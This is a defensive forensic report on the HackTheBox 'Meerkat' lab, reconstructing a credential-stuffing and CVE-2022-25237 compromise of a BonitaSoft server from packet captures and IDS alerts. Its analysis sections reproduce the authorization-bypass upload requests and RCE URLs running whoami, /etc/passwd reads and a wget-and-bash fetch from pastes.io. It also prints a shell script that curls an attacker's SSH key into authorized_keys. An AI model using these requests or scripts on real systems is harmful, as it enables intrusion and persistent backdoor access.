# 🔍 Business Management Platform Compromise Analysis Report — Meerkat

* **Date of Analysis:** September 10, 2025
* **Analyst:** Belhamici Abderrahmane
* **Source:** [HackTheBox Sherlock — *Meerkat*](https://app.hackthebox.com/sherlocks/Meerkat)
* **Target Environment:** BonitaSoft Business Management Platform
* **Dataset:** Pcap file and Json file (alerts)
* **Incident Date:** January 19, 2023
* **Client Organization:** Forela (forela.co.uk)

---

## 1. Executive Summary

This report details the analysis of a sophisticated multi-stage cyberattack against Forela's BonitaSoft business management platform. The incident involved credential stuffing attacks, exploitation of CVE-2022-25237 (authorization bypass vulnerability), remote code execution, and establishment of persistent backdoor access via SSH key injection.

The attack demonstrated advanced operational security techniques, progressing from automated credential testing to complete system compromise within a 16-minute operational window. The threat actors successfully established persistent access through SSH key manipulation and utilized legitimate file-sharing services to host malicious payloads, highlighting the evolution of modern attack methodologies.

The compromise resulted in full administrative access to the business management platform and persistent backdoor access to the underlying Ubuntu server infrastructure.

---

## 2. Case Overview

* **Incident Timeline:** January 19, 2023, 15:29:30 - 15:45:27 UTC
* **Attack Duration:** ~16 minutes active operations
* **Target System:** forela.co.uk:8080 (BonitaSoft Platform)
* **Server Infrastructure:** 172.31.6.44 (Ubuntu Server)
* **Primary Attackers:** 156.146.62.213, 138.199.59.221
* **Persistence Access:** 95.181.232.30 (SSH connection)
* **Attack Vector:** Credential stuffing + CVE-2022-25237 exploitation
* **Business Impact:** Complete platform compromise with persistent backdoor

---

## 3. Key Findings

### 3.1 Attack Infrastructure Summary

* **Target Platform:** BonitaSoft Business Management Application
* **Vulnerable Component:** Authorization filter bypass (CVE-2022-25237)
* **Primary Attack IPs:** 
  - 156.146.62.213 (Initial compromise phase)
  - 138.199.59.221 (Exploitation and persistence phase)
  - 95.181.232.30 (SSH backdoor access)
* **Compromised Credentials:** seb.broom@forela.co.uk:g0vernm3nt
* **Persistence Mechanism:** SSH authorized_keys manipulation (MITRE T1098.004)
* **External Infrastructure:** pastes.io file sharing service

### 3.2 Attack Progression Overview

**Phase 1 - Reconnaissance & Credential Stuffing (15:31:11 - 15:37:38)**
* 112 POST requests to `/bonita/loginservice`
* 111 failed authentication attempts (HTTP 401)
* 56 unique username/password combinations tested
* 1 successful authentication (HTTP 204) at 15:35:04

**Phase 2 - Initial Exploitation (15:35:04 - 15:35:05)**
* Successful login with seb.broom@forela.co.uk credentials
* CVE-2022-25237 exploitation using `i18ntranslation` bypass string
* Malicious API extension upload (`rce_api_extension.zip`)
* Remote code execution capability established

**Phase 3 - System Reconnaissance (15:35:05)**
* Command execution via custom API extension
* `whoami` command execution confirming root access
* Evidence cleanup (malicious extension deletion)

**Phase 4 - Advanced Exploitation (15:38:35 - 15:39:19)**
* Secondary IP (138.199.59.221) authentication with same credentials
* System reconnaissance via `/etc/passwd` enumeration
* Malicious payload download from pastes.io
* SSH persistence mechanism deployment

**Phase 5 - Persistence Establishment (15:39:18)**
* Execution of downloaded shell script
* SSH public key injection into authorized_keys
* SSH service restart for immediate access

**Phase 6 - Backdoor Access (15:40:12)**
* SSH connection from 95.181.232.30
* Successful persistent access using injected SSH key

---

## 4. Technical Analysis

### 4.1 Credential Stuffing Attack Analysis

**Attack Methodology:**
* **Target Endpoint:** `/bonita/loginservice`
* **Request Method:** POST requests with form data
* **User Agent:** python-requests/2.28.1 (automated tooling)
* **Attack Pattern:** Systematic credential testing with minimal delays
* **Success Rate:** 1/112 attempts (0.89% success rate)

**Credential Testing Statistics:**
* **Total Attempts:** 112 login requests
* **Unique Combinations:** 56 username/password pairs
* **Failed Attempts:** 111 (HTTP 401 Unauthorized)
* **Successful Attempt:** 1 (HTTP 204 No Content)
* **Attack Duration:** 6 minutes 8 seconds
* **Average Request Interval:** ~3.3 seconds

**Successful Credentials:**
```
Username: seb.broom@forela.co.uk
Password: g0vernm3nt
Timestamp: 2023-01-19 15:35:04
Response: HTTP 204 (Success)
```

### 4.2 CVE-2022-25237 Exploitation Analysis

**Vulnerability Details:**
* **CVE ID:** CVE-2022-25237
* **Component:** BonitaSoft authorization filter
* **Bypass String:** `i18ntranslation`
* **Impact:** Authentication and authorization bypass
* **Exploitation Method:** URL parameter injection

**Exploitation Sequence:**
1. **Initial Upload Request:**
   ```
   POST /bonita/API/pageUpload;i18ntranslation?action=add
   Content-Disposition: form-data; name="file"; filename="rce_api_extension.zip"
   Content-Length: 15163
   ```

2. **API Extension Registration:**
   ```
   POST /bonita/API/portal/page/;i18ntranslation
   Content-Type: application/json;charset=UTF-8
   {"contentName": "rce_api_extension.zip", "pageZip": "tmp_14830419339383496080.zip"}
   ```

3. **Extension Deployment Response:**
   ```json
   {
     "urlToken": "custompage_resourceNameRestAPI",
     "displayName": "RCE",
     "description": "REST API to manage resourceName",
     "id": "130",
     "contentType": "apiExtension"
   }
   ```

### 4.3 Remote Code Execution Analysis

* **RCE Endpoint:** `/bonita/API/extension/rce`
* **Execution Method:** GET requests with command parameters
* **Privilege Level:** Root access confirmed

**Command Execution Examples:**
1. **Identity Verification:**
   ```
   GET /bonita/API/extension/rce?p=0&c=1&cmd=whoami
   Response: {"cmd": "whoami", "out": "root\n"}
   ```

2. **System Reconnaissance:**
   ```
   GET /bonita/API/extension/rce?p=0&c=1&cmd=cat%20/etc/passwd
   Response: {"cmd": "cat /etc/passwd", "out": "[FULL_PASSWD_FILE]"}
   ```

3. **Payload Download:**
   ```
   GET /bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8
   ```

4. **Script Execution:**
   ```
   GET /bonita/API/extension/rce?p=0&c=1&cmd=bash%20bx5gcr0et8
   ```

### 4.4 Persistence Mechanism Analysis

**Primary Persistence Vector:** SSH Authorized Keys Manipulation (T1098.004)

**Malicious Script Analysis (bx5gcr0et8):**
```bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

**SSH Public Key (hffgra4unv):**
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN
```

**Persistence Mechanism:**
* **Target File:** `/home/ubuntu/.ssh/authorized_keys`
* **Method:** SSH key appending (not replacement)
* **Service Manipulation:** SSH daemon restart for immediate effect
* **Access Method:** Passwordless SSH authentication
* **Privilege Level:** Direct ubuntu user access

### 4.5 Network Traffic Analysis

**PCAP Analysis Summary:**
* **First Packet:** 2023-01-19 15:29:30
* **Last Packet:** 2023-01-19 15:45:27
* **Total Duration:** 15 minutes 56 seconds
* **Active Attack Window:** ~9 minutes (15:31:11 - 15:40:12)

**Traffic Pattern Analysis:**
```
156.146.62.213 → 172.31.6.44:8080 (Initial compromise)
138.199.59.221 → 172.31.6.44:8080 (Exploitation phase)
95.181.232.30  → 172.31.6.44:22   (SSH backdoor access)
```

**Communication Characteristics:**
* **Protocol:** HTTP/1.1 over TCP port 8080
* **User-Agent:** python-requests/2.28.1 (consistent across IPs)
* **Request Pattern:** Automated with systematic timing
* **Response Analysis:** Standard BonitaSoft API responses

---

## 5. External Infrastructure Analysis

### 5.1 File Sharing Service Analysis

**Service Provider:** pastes.io
* **Type:** Legitimate text/code sharing platform
* **Usage Pattern:** Hosting malicious scripts and SSH keys
* **URLs Observed:**
  - https://pastes.io/raw/bx5gcr0et8 (shell script)
  - https://pastes.io/raw/hffgra4unv (SSH public key)

**Operational Security Considerations:**
* **Legitimate Service Abuse:** Using trusted platforms to host malicious content
* **Content Obfuscation:** Generic filenames (bx5gcr0et8, hffgra4unv)
* **Persistence Strategy:** External hosting ensures payload availability
* **Detection Evasion:** Legitimate HTTPS traffic to known service

### 5.2 Attack Infrastructure Assessment

**IP Address Analysis:**
* **156.146.62.213:** Initial attack vector, credential stuffing phase
* **138.199.59.221:** Secondary exploitation, persistence establishment
* **95.181.232.30:** SSH backdoor access, post-compromise activity

**Operational Patterns:**
* **Multi-IP Coordination:** Distributed attack across multiple source addresses
* **Tool Consistency:** Same User-Agent across different IP addresses
* **Timing Coordination:** Sequential phases with minimal overlap
* **Access Validation:** Immediate SSH connection after key injection

---

## 6. MITRE ATT&CK Framework Mapping

### 6.1 Attack Techniques Identified

| Technique ID | Technique Name | Evidence | Timestamp |
|--------------|----------------|----------|-----------|
| T1110.004 | Credential Stuffing | 112 automated login attempts | 15:31:27 - 15:37:35 |
| T1078.003 | Valid Accounts: Local Accounts | Successful authentication with seb.broom credentials | 15:35:04 |
| T1190 | Exploit Public-Facing Application | CVE-2022-25237 exploitation | 15:35:04 |
| T1505.003 | Server Software Component: Web Shell | RCE API extension deployment | 15:35:04 |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | Remote command execution | 15:35:05 |
| T1082 | System Information Discovery | /etc/passwd enumeration | 15:38:46 |
| T1105 | Ingress Tool Transfer | wget download of malicious script | 15:38:52 |
| T1098.004 | Account Manipulation: SSH Authorized Keys | SSH key injection for persistence | 15:39:18 |
| T1021.004 | Remote Services: SSH | SSH backdoor access | 15:40:12 |

### 6.2 Attack Chain Analysis

**Kill Chain Progression:**
1. **Reconnaissance:** Platform identification and endpoint discovery
2. **Weaponization:** Credential stuffing automation and RCE payload creation
3. **Delivery:** HTTP-based credential testing and payload upload
4. **Exploitation:** CVE-2022-25237 authorization bypass
5. **Installation:** Malicious API extension deployment
6. **Command & Control:** RCE endpoint establishment
7. **Actions on Objectives:** System reconnaissance, persistence, and backdoor access

**Tactics, Techniques, and Procedures (TTPs):**
* **Initial Access:** Credential stuffing against web application
* **Persistence:** SSH authorized keys manipulation
* **Privilege Escalation:** Root-level command execution capability
* **Defense Evasion:** Authorization filter bypass, legitimate service abuse
* **Discovery:** System user enumeration
* **Collection:** System configuration harvesting
* **Command and Control:** Custom API extension, external script hosting

---

## 7. Indicators of Compromise (IOCs)

### 7.1 Network Indicators

| Indicator | Type | Description | Threat Level |
|-----------|------|-------------|--------------|
| `156.146.62.213` | IP Address | Primary credential stuffing source | Critical |
| `138.199.59.221` | IP Address | Secondary exploitation source | Critical |
| `95.181.232.30` | IP Address | SSH backdoor access | Critical |
| `172.31.6.44` | IP Address | Compromised BonitaSoft server | Critical |
| `forela.co.uk:8080` | Hostname:Port | Compromised application endpoint | Critical |
| `python-requests/2.28.1` | User-Agent | Attack tool fingerprint | High |

### 7.2 Application Indicators

| Indicator | Type | Description | Threat Level |
|-----------|------|-------------|--------------|
| `/bonita/loginservice` | URL Path | Credential stuffing target | High |
| `/bonita/API/pageUpload;i18ntranslation` | URL Path | CVE-2022-25237 exploitation | Critical |
| `/bonita/API/extension/rce` | URL Path | Remote code execution endpoint | Critical |
| `rce_api_extension.zip` | Filename | Malicious API extension | Critical |
| `tmp_14830419339383496080.zip` | Filename | Server-side malicious file | Critical |
| `custompage_resourceNameRestAPI` | Token | Malicious extension identifier | Critical |
| `i18ntranslation` | String | Authorization bypass parameter | Critical |

### 7.3 System Indicators

| Indicator | Type | Description | Threat Level |
|-----------|------|-------------|--------------|
| `seb.broom@forela.co.uk` | Username | Compromised account | Critical |
| `g0vernm3nt` | Password | Compromised credential | Critical |
| `/home/ubuntu/.ssh/authorized_keys` | File Path | Persistence mechanism target | Critical |
| `bx5gcr0et8` | Filename | Malicious script identifier | High |
| `hffgra4unv` | Filename | SSH public key identifier | Critical |

### 7.4 External Indicators

| Indicator | Type | Description | Threat Level |
|-----------|------|-------------|--------------|
| `https://pastes.io/raw/bx5gcr0et8` | URL | Malicious script hosting | Critical |
| `https://pastes.io/raw/hffgra4unv` | URL | SSH public key hosting | Critical |
| `pastes.io` | Domain | Attacker infrastructure | High |

### 7.5 Temporal Indicators

| Indicator | Type | Description |
|-----------|------|-------------|
| `2023-01-19 15:35:04` | Timestamp | Successful authentication |
| `2023-01-19 15:39:18` | Timestamp | SSH key injection |
| `2023-01-19 15:40:12` | Timestamp | SSH backdoor access |

---

## 8. Security Detection Analysis

### 8.1 Alert Analysis (meerkat-alerts.json)

**Alert 1: Staging Detection**
```
ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 
(Possible Staging for CVE-2022-25237)
Source IPs: 156.146.62.213, 138.199.59.221
```

**Alert 2: Data Exfiltration**
```
ET ATTACK_RESPONSE Possible /etc/passwd via HTTP (linux style)
Source IP: 172.31.6.44
```

**Detection Effectiveness:**
* **Proactive Detection:** CVE-2022-25237 staging identified
* **Response Detection:** /etc/passwd exfiltration caught
* **Coverage Gap:** SSH persistence mechanism not detected
* **Timing:** Alerts generated during active exploitation phase

### 8.2 Detection Timeline

| Time | Event | Detection Status |
|------|--------|------------------|
| 15:31:27 | Credential stuffing begins | DETECTED (Login attempts) |
| 15:35:04 | CVE-2022-25237 exploitation | DETECTED (Staging alert) |
| 15:38:46 | /etc/passwd enumeration | DETECTED (Data exfiltration) |
| 15:39:18 | SSH key injection | NOT DETECTED |
| 15:40:12 | SSH backdoor access | NOT DETECTED |

---

## 9. Impact Assessment

### 9.1 Immediate Impact

**Application Compromise:**
* Complete administrative access to BonitaSoft platform
* Remote code execution capability with root privileges
* Ability to manipulate business processes and data
* Potential for additional malicious extension deployment

**System Compromise:**
* Root-level command execution on Ubuntu server
* Full system reconnaissance completed
* Persistent backdoor access established
* SSH service manipulation performed

**Data Exposure:**
* System user accounts enumerated (/etc/passwd)
* Potential access to all business management data
* Authentication credentials potentially harvested
* System configuration details exposed

### 9.2 Long-term Consequences

**Operational Impact:**
* Business continuity disruption potential
* Data integrity concerns for business processes
* Compliance violations for data protection
* Customer trust and reputation damage

**Security Implications:**
* Persistent backdoor access for future attacks
* Potential lateral movement to connected systems
* Long-term reconnaissance and data collection
* Advanced persistent threat establishment

**Financial Impact:**
* Incident response and recovery costs
* Potential regulatory fines and penalties
* Business process disruption costs
* Security infrastructure upgrade requirements

---

## 10. Recommendations

### 10.1 Immediate Actions

**Critical Response:**
* **System Isolation:** Immediately isolate 172.31.6.44 from network access
* **SSH Hardening:** Remove all unauthorized keys from `/home/ubuntu/.ssh/authorized_keys`
* **Account Security:** Force password reset for seb.broom@forela.co.uk and all users
* **Service Restart:** Restart SSH and BonitaSoft services with clean configurations
* **IP Blocking:** Block 156.146.62.213, 138.199.59.221, and 95.181.232.30 at firewall
* **Extension Audit:** Remove all unauthorized API extensions from BonitaSoft
* **Log Preservation:** Secure all logs for forensic analysis and legal requirements

**Containment Measures:**
* **Network Segmentation:** Implement strict network access controls for business applications
* **Privilege Review:** Audit and restrict administrative access to critical systems
* **Session Termination:** Invalidate all active BonitaSoft sessions
* **Backup Verification:** Ensure system backups are clean and available for restoration
* **Change Management:** Implement temporary approval process for all system changes

### 10.2 Medium-term Security Enhancements

**Application Security:**
* **Patch Management:** Update BonitaSoft to latest version addressing CVE-2022-25237
* **Authentication Controls:** Implement multi-factor authentication for all administrative accounts
* **Input Validation:** Deploy Web Application Firewall (WAF) with input sanitization
* **API Security:** Implement strict API access controls and rate limiting
* **Session Management:** Deploy secure session management with timeout controls

**Infrastructure Hardening:**
* **SSH Security:** Disable password authentication, implement key-based authentication only
* **Network Security:** Deploy network intrusion detection/prevention systems
* **Endpoint Protection:** Install and configure advanced endpoint detection and response
* **Privilege Management:** Implement privileged access management (PAM) solution
* **Monitoring Enhancement:** Deploy SIEM solution with behavioral analytics

### 10.3 Long-term Strategic Improvements

**Security Architecture:**
* **Zero Trust Implementation:** Deploy zero trust network architecture
* **Identity Management:** Implement enterprise identity and access management
* **Security Orchestration:** Deploy security orchestration, automation, and response (SOAR)
* **Threat Intelligence:** Integrate threat intelligence feeds and analysis
* **Risk Management:** Establish comprehensive cybersecurity risk management program

**Operational Improvements:**
* **Incident Response:** Develop and test comprehensive incident response procedures
* **Security Training:** Implement regular security awareness training for all staff
* **Vulnerability Management:** Establish proactive vulnerability assessment and patching
* **Compliance Framework:** Implement security compliance monitoring and reporting
* **Business Continuity:** Develop and test business continuity and disaster recovery plans

### 10.4 Detection and Monitoring Enhancements

**Enhanced Monitoring:**
* **Authentication Monitoring:** Monitor for multiple failed login attempts and credential stuffing patterns
* **API Monitoring:** Implement monitoring for unusual API extension uploads and executions
* **File Integrity Monitoring:** Monitor critical system files including SSH authorized_keys
* **Network Monitoring:** Deploy network traffic analysis for unusual communication patterns
* **Behavioral Analytics:** Implement user and entity behavior analytics (UEBA)

**Alert Tuning:**
* **Credential Stuffing Detection:** Tune alerts for automated login attempt patterns
* **CVE-specific Rules:** Implement specific detection rules for known CVE exploitation
* **SSH Monitoring:** Monitor SSH key changes and unusual SSH connections
* **External Communication:** Monitor connections to file-sharing and paste services
* **Privilege Escalation:** Implement detection for unusual privilege escalation activities

---

## 11. Lessons Learned

### 11.1 Attack Sophistication Analysis

**Technical Capabilities:**
* **Multi-vector Approach:** Combined credential stuffing with targeted CVE exploitation
* **Operational Security:** Used multiple IP addresses and legitimate services for obfuscation
* **Persistence Techniques:** Implemented advanced persistence through SSH key manipulation
* **Tool Usage:** Employed automated tools with professional operational patterns

**Strategic Considerations:**
* **Target Selection:** Focused on business-critical platform with high impact potential
* **Timing Optimization:** Executed attack during business hours for immediate impact
* **Infrastructure Abuse:** Leveraged legitimate services to host malicious content
* **Evidence Management:** Cleaned up initial access vectors while maintaining persistence

### 11.2 Security Control Gaps

**Prevention Failures:**
* **Patch Management:** Unpatched CVE-2022-25237 vulnerability enabled exploitation
* **Authentication Controls:** Weak password policies enabled credential stuffing success
* **Input Validation:** Insufficient input validation allowed authorization bypass
* **Network Security:** Inadequate network segmentation enabled lateral movement

**Detection Limitations:**
* **Persistence Monitoring:** SSH key modifications not monitored or alerted
* **Behavioral Analysis:** Unusual API extension activities not flagged immediately
* **Correlation Analysis:** Multiple related events not correlated for comprehensive view
* **Real-time Response:** Insufficient real-time response to credential stuffing patterns

### 11.3 Response Improvements

**Incident Response:**
* **Detection Speed:** Need faster detection and response to credential stuffing attacks
* **Automated Response:** Implement automated blocking of suspicious IP addresses
* **Escalation Procedures:** Improve escalation for critical vulnerability exploitation
* **Communication Plans:** Enhance internal and external communication procedures

**Recovery Planning:**
* **Backup Strategy:** Ensure clean backup availability for rapid recovery
* **System Hardening:** Implement immediate hardening procedures post-incident
* **Validation Testing:** Establish comprehensive testing procedures for system restoration
* **Documentation:** Maintain detailed incident documentation for lessons learned

---

## 12. Technical Appendix

### 12.1 HTTP Request Pattern Analysis

**Credential Stuffing Pattern:**
```http
POST /bonita/loginservice HTTP/1.1
Host: forela.co.uk:8080
User-Agent: python-requests/2.28.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

username=[USERNAME]&password=[PASSWORD]&redirectUrl=&tenant=1
```

**CVE-2022-25237 Exploitation Pattern:**
```http
POST /bonita/API/pageUpload;i18ntranslation?action=add HTTP/1.1
Host: forela.co.uk:8080
User-Agent: python-requests/2.28.1
Content-Type: multipart/form-data; boundary=----[BOUNDARY]
Content-Length: 15163

------[BOUNDARY]
Content-Disposition: form-data; name="file"; filename="rce_api_extension.zip"
Content-Type: application/octet-stream

[MALICIOUS_EXTENSION_DATA]
------[BOUNDARY]--
```

**Remote Code Execution Pattern:**
```http
GET /bonita/API/extension/rce?p=0&c=1&cmd=[COMMAND] HTTP/1.1
Host: forela.co.uk:8080
User-Agent: python-requests/2.28.1
```

### 12.2 Timeline Analysis Summary

```
15:29:30 - PCAP capture begins
15:31:11 - First HTTP request from 156.146.62.213
15:31:27 - Credential stuffing attack begins (112 attempts)
15:35:04 - Successful authentication (seb.broom@forela.co.uk:g0vernm3nt)
15:35:04 - CVE-2022-25237 exploitation begins
15:35:05 - RCE extension deployed and tested
15:37:38 - First attack phase concludes
15:38:35 - Second attack phase begins (138.199.59.221)
15:38:46 - System reconnaissance (/etc/passwd)
15:38:52 - Malicious payload download (pastes.io)
15:39:18 - SSH persistence establishment
15:39:19 - Second attack phase concludes
15:40:12 - SSH backdoor access (95.181.232.30)
15:45:27 - PCAP capture ends
```

### 12.3 File Hash Analysis

**Malicious Extension (rce_api_extension.zip):**
* **Size:** 15,163 bytes
* **Upload Time:** 2023-01-19 15:35:04
* **Server Filename:** tmp_14830419339383496080.zip
* **API Extension ID:** 130
* **URL Token:** custompage_resourceNameRestAPI

**Persistence Script (bx5gcr0et8):**
```bash
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

**SSH Public Key (hffgra4unv):**
* **Type:** RSA 2048-bit
* **Format:** OpenSSH public key format
* **Fingerprint:** [Not calculable from provided data]

---

✅ **Conclusion:**

The Meerkat incident represents a sophisticated, multi-stage cyberattack that successfully compromised Forela's BonitaSoft business management platform through a combination of credential stuffing, CVE exploitation, and advanced persistence techniques. The attack demonstrates the critical importance of comprehensive security controls including patch management, strong authentication mechanisms, and behavioral monitoring.

The 16-minute operational window from initial credential stuffing to persistent backdoor establishment highlights the speed and efficiency of modern attack methodologies. The threat actors' use of legitimate file-sharing services and systematic operational security measures indicates a high level of sophistication and planning.

This incident underscores the need for organizations to implement multi-layered security controls, including real-time threat detection, automated response capabilities, and comprehensive monitoring of both application and system-level activities. The successful exploitation of CVE-2022-25237 demonstrates the critical importance of maintaining current patch levels and implementing compensating controls for known vulnerabilities.

The establishment of persistent access through SSH key manipulation represents a significant long-term risk that requires immediate remediation and enhanced monitoring of privileged access mechanisms. Organizations must implement comprehensive identity and access management controls, including monitoring of SSH key modifications and privileged account activities, to defend against similar advanced persistent threat scenarios.